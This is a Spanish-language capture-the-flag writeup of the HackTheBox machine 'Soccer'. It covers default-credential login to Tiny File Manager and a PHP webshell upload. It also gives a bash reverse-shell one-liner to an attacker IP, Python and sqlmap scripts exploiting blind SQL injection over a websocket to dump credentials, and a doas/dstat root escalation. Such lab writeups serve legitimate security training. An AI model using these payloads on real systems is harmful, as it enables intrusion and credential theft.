---
title: "Soccer"
date: 2025-05-29 16:41:46 +0200
categories: writeups HackTheBox
tags: máquina linux websocket python scripting inyecciónsql rce internalservice suid doas tinyfilemanager
description: Writeup de la máquina Soccer de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Soccer** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**. Realizando fuzzing con `gobuster` descubriremos el directorio `/tiny` donde se aloja la aplicación **Tiny File Manager**, a la que nos logearemos usando las credenciales por defecto. Al ser un gestor de ficheros conseguiremos ganar acceso a la máquina víctima gracias a la subida de una `webshell` mediante la cual nos enviaremos una **Reverse Shell**. Una vez hemos ganado acceso a la máquina víctima descubriremos la existencia del subdominio **soc-player.soccer.htb**, tras logearnos conseguiremos explotar una **Blind SQL Inyection** a través de un **Websocket**, de forma manual con un script de `python` y de manera automatizada con `sqlmap`. Tras dumpear la información de la base de datos obtendremos las credenciales del usuario **player**. Finalmente, nos convertiremos en el usuario **root** gracias al permiso **SUID** sobre el binario **doas** que nos permite ejecutar **/usr/bin/dstat** como **root** y sin proporcionar contraseña.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123193218.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.194`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.194 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22, 80 y 9091**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123193654.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80,9091 -sCV 10.10.11.194 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es la existencia del puerto **9091** y el dominio **soccer.htb**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123193740.png>)

___
### Puerto 80 - HTTP (Nginx)

Para poder acceder a la página web hemos de aplicar **Virtual Hosting** para ello añadiremos la siguiente línea `10.10.11.194   soccer.htb` al `/etc/hosts`. 

Comprobaremos que ahora somos capaces de ver la página web.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123194928.png>)

Como en la página web no vemos nada interesante realizaremos fuzzing de directorios y archivos usando **Gobuster** de la siguiente forma.

```bash
gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,js,txt -t 50
```

Tal y como vemos a continuación, nos encuentra el directorio **/tiny**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195216.png>)

___
## Explotación
### Default Credentials

Al dirigirnos a dicho directorio descubierto veremos un panel de login correspondiente a la aplicación **Tiny File Manager**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195041.png>)

Buscaremos en internet por las credenciales por defecto para dicho aplicativo y nos encontraremos con **admin:admin@123**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195114.png>)

Al probar dichas credenciales veremos que conseguimos conectarnos como el usuario administrador en **Tiny File Manager**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195135.png>)
### Upload Arbitrary File | RCE

En este punto lo que debemos de hacer es buscar una forma de subir archivos, ya que al ser una gestor de ficheros seguro que cuenta con dicha funcionalidad. 

Si nos fijamos arriba a la derecha tiene un botón que pone **Upload**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195646.png>)

En primer lugar, intentaremos subir el **cmd.php** en **/var/www/html** y nos dirá que no tenemos permisos de escritura.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195316.png>)

Alternativamente intentaremos subirlo en **/var/www/html/tiny/uploads** donde si tenemos permisos de escritura.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195440.png>)

Tal y como se aprecia en la captura logramos tener ejecución remota de comandos (**RCE**) en la máquina vícitima.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195617.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nvlp 443`) y posteriormente nos enviaremos una **Reverse Shell** gracias al típico one liner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.16.4/443 0>%261"`).

Observamos que recibimos la **Reverse Shell** correctamente por lo que habremos ganado acceso a la máquina víctima.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195529.png>)
___
## Movimiento lateral de usuario
### Enumeración local

En primer lugar realizaremos un **Tratamiento de la TTY** para poder operar desde una terminal más cómoda.

Nos daremos cuenta que existe el usuario **player** por lo que tendremos que migrar a este para poder convertirnos en **root**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123200950.png>)

En el fichero **tinyfilemanager.php** veremos las credenciales por defecto escritas en un comentario.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123201721.png>)

Al revisar los servicios internos en escucha nos daremos cuenta que está abierto el puerto **3000**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123195926.png>)
### Puerto 3000 - Internal Service (HTTP)

Al revisar los archivos de configuración de **nginx** entenderemos que el existe un subdominio (**soc-player.soccer.htb**) el cual pasa a través del puerto que está abierto internamente, es decir el **3000**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123202243.png>)

Volveremos a realizar **Virtual Hosting** actualizando el `/etc/hosts` con la siguiente línea `10.10.11.194   soccer.htb   soc-player.soccer.htb`.

Veremos que la página es muy similar a la que podemos ver en el dominio principal, la única diferencia es la existencia de los botones **Match**, **Login** y **Singup**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123202334.png>)

Nos registraremos para posteriormente logearnos y así conseguir el **free ticket** que nos mencionaban. 

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123203135.png>)

Observamos que tenemos un pequeño formulario a través del cual podemos saber si nuestro ticket es válido.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123203250.png>)

Cuando introducimos uno inválido nos dice **Ticket Doesn't Exist**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123203309.png>)
#### Boolean SQL Inyection

Probaremos la típica **SQL Injection** tal y como vemos a continuación. 

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123203529.png>)

Si bien nos hemos dado cuenta el formulario es extraño, ya que no tiene ningún botón para enviar los datos, pues se están enviando al darle al <kbd>Enter</kbd>.

Tras investigar el código fuente veremos que se está realizando una consulta a un **Websocket** el cual está alojado en el puerto **9091**..

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123204336.png>)

Además gracias a **BurpSuite** podemos saber que se trata de un **Websocket** pues al realizar una petición aparece en el apartado de **Websockets History** .

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123204924.png>)

En este punto lo que debemos de hacer es encontrar la forma de explotar la **SQL Injection** a través de un **Websocket**, es decir descubrir como comunicarnos con él.
##### Automated - [SQLMap
](<../../Introducción al Hacking/Material Adicional/SQLMap/SQLMap.md>)
En este caso estaremos usando **SQLMap** ya que cuenta la propia herramienta es capaz de comunicarse con el **Websocket** usando la librería de python **websocket-sclient** (`pip3 install websocket-client`).

>En el caso de que no hayamos descubierto dicha funcionalidad de **SQLMap** podemos montarnos un **Middleware Server** para que actué de intermediario entre el **Websocket** y nosotros, para aprender a montarlo nos dirigiremos a **Manual - Python Script**.
###### Todas las bases de datos

Para obtener todas las bases de datos debemos de usar el siguiente comando.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "1234"}' --batch --dbs --level 5 --risk 3
```

Entre todas las bases de datos que nos reporta nos llamará la atención **soccer_db**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123210026.png>)
###### Tablas de soccer_db

A continuación, mostraremos las tablas de **soccer_db** gracias a la siguiente instrucción.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "1234"}' --batch -D soccer_db --tables --level 5 --risk 3
```

Tal y como apreciamos abajo tan solo nos reporta una tabla, **accounts**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123210219.png>)
###### Columnas de accounts

Después, mostraremos las columnas de la tabla **accounts** gracias al comando subsiguiente.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "1234"}' --batch -D soccer_db -T accounts --columns --level 5 --risk 3
```

Nos quedaremos con la columna **username** y **password**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211047.png>)
###### Información de accounts

Finalmente, mostraremos la información de la tabla **accounts** con la próxima orden.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "1234"}' --batch -D soccer_db -T accounts -C username,password --dump --level 5 --risk 3
```

Observaremos las credenciales **player:PlayerOfTheMatch2022**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211350.png>)
##### Manual - Python Script

Otra alternativa de explotar la **Inyección SQL basada en booleanos** es de manera manual a través de un script de python.
###### server.py

Gracias al siguiente recurso [Websocket Pentesting](https://exploit-notes.hdks.org/exploit/web/websocket-pentesting/) conoceremos como montar un **Middleware Server** que actúe de intermediario entre nosotros y el **Websocket**, en definitiva nos permitirá comunicarnos más fácilmente.

Para montar el **Middleware Server** hemos de crear el siguiente script.

```python
#!/usr/bin/env python3

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://10.10.11.194:9091/" # Ajustar según nuestras necesidades

def send_ws(payload):
    ws = create_connection(ws_server)

    message = unquote(payload).replace('"', '\'')
    data = '{"id":"%s"}' % message
    
    ws.send(data)
    resp = ws.recv()
    ws.close()
    
    if resp:
        return resp
    else:
        return ''

def middleware_server(host_port, content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False
            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'
                
            self.send_header("Content-Type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return
            
    class _TCPServer(TCPServer):
            allow_reuse_address = True
            
    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()

print("[+] Starting Middleware Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
    middleware_server(('0.0.0.0', 8081))
except KeyboardInterrupt:
    pass
```

Realizaremos una petición al **Middleware Server** de la siguiente forma.

```bash
curl -s "http://localhost:8081/?id=12%20or%201=1--%20-" # Hemos URL Encodear los espacios para evitar errores
```

Tal y como observamos en la captura de pantalla podemos ver que nos estamos comunicando correctamente con el **Websocket** a través del **Middleware Server**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123210121.png>)
###### exploit_via_Middleware.py

Finalmente, nos crearemos el exploit para dumpear toda la información de la base de datos apoyándonos en el **Middleware Server**.

```python
#!/usr/bin/env python3

# Author: Álvaro Bernal (aka. trr0r)

import requests,string,signal,sys,time
from pwn import *
from termcolor import colored

# CTRL+C to stop exploit
def ctrl_c(key, event):
    print(colored("\n\nSaliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

main_url = "http://localhost:8081"

# Current Database: f"id=1%20or%20substring(database(),{position},1)='{char}'--%20-"
# All Databases: f"id=1%20or%20substring((select%20group_concat(schema_name)%20from%20information_schema.schemata),{position},1)='{char}'--%20-"
# Tables from a database: f"id=1%20or%20substring((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20'soccer_db'),{position},1)='{char}'--%20-"
# Columns from a table: f"id=1%20or%20substring((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%20=%20'soccer_db' and table_name = 'accounts'),{position},1)='{char}'--%20-"
# Dump informaction: f"id=1%20or%20substring((select%20group_concat(BINARY(username),0x3a,BINARY(password))%20from%20accounts),{position},1)='{char}'--%20-"



def main():
    cadena = ""
    characters = string.ascii_lowercase + string.digits + string.ascii_uppercase +"_-:,"
    
    p1 = log.progress("URL")
    p1.status("Blind SQLI")
    p2 = log.progress("Información Extraída")
    
    for position in range(1, 100):
        for char in characters:
        
            payload = f"id=1%20or%20substring((select%20group_concat(BINARY(username),0x3a,BINARY(password))%20from%20accounts),{position},1)='{char}'--%20-"
            r = requests.get(main_url, params=payload)
            p1.status(r.url)
            
            if "Ticket Exists" in r.text:
                cadena += char
                p2.status(cadena)
                break

if __name__ == '__main__':

    main()

```
###### exploit_via_wesocket.py

Alternativamente usaremos este exploit para dumpear toda la información conectándonos directamente a través del **Websocket**.

```python
#!/usr/bin/env python3
from websocket import create_connection
import string,sys,signal
from pwn import *
from termcolor import colored

# Author: Álvaro Bernal (aka. trr0r)

def ctrl_c(key, event):
    print(colored("\n\nSaliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

ws_server = "ws://10.10.11.194:9091/"

def exploit():

    cadena = ""
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + ":,_."
    ws = create_connection(ws_server)
    p1 = log.progress("URL")
    p2 = log.progress("Información extraída")
    
    for position in range(1, 100):
        for char in characters:
        
            data = '{"id":"1 or substring((select group_concat(BINARY(username),0x3a,BINARY(password)) from accounts ),%d,1)=\'%s\'"}' % (position, char)
            
            ws.send(data)
            resp = ws.recv()
            p1.status(data)
            
            if "Ticket Exists" in resp:
                cadena += char
                p2.status(cadena)
                break
                
    ws.close()


if __name__ == '__main__':
	exploit()
```

A continuación, veremos una casuística a tener en cuenta. 

Al dumpear la información de la tabla **soccer_db** nos la mostrará sin tener en cuenta las mayúsculas y minúsculas, es decir case insensitive.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250124160809.png>)

Para que sea case sensitive, es decir para que nos distinga entre mayúsculas y minúsculas, algo muy importante si estamos hablando de credenciales usaremos la siguiente función `BINARY(password)`.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250124161712.png>)

___
## Escalada de privilegios
### Enumeración local

Nos autenticaremos como el usuario **player** gracias a las credenciales dumpeadas.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211321.png>)

Tal y como vemos a continuación, no tendremos asignado ningún permiso de **Sudoers**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211435.png>)

Al revisar los permisos **SUID** nos llamará la atención el binario **/usr/local/bin/doas**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211509.png>)
### /usr/local/bin/doas

Tras buscar en internet nos encontraremos con el siguiente recurso [Privilege Escalation - Doas](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/), en este nos explica como elevar nuestros privilegios. Además, destacar que **doas** es muy similar a **sudo**.

En primer lugar, debemos de buscar el fichero de configuración correspondiente al binario **doas**, para ello ejecutaremos el siguiente comando.

```bash
find / -name doas.conf 2>/dev/null
```

Tal y como apreciamos en la siguiente captura podemos ver la localización del fichero de configuración correspondiente a **doas**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211548.png>)

Al mirar el contenido del fichero de configuración nos daremos cuenta que podemos ejecutar **/usr/bin/dstat** como root sin proporcionar contraseña.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211606.png>)
#### /usr/bin/dstat

Si nos dirigimos a nuestra página de confianza ([GTFOBins - Sudo dstat](https://gtfobins.github.io/gtfobins/dstat/#sudo)) podemos ver como elevar nuestros privilegios.

En primer lugar, nos crearemos un script de python donde el nombre debe de empezar por **dstat**, en definitiva ejecutaremos el siguiente comando.

```bash
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_trr0r.py
```

En segundo lugar, ejecutaremos **/usr/bin/dstat** con **doas** pasándole el script de python recientemente creado, es decir tal que así.

```bash
/usr/local/bin/doas /usr/bin/dstat --trr0r
```

Finalmente, veremos como hemos conseguido convertirnos en el usuario **root**.

![](<../assets/images/posts/2025-05-29-soccer/Pasted image 20250123211911.png>)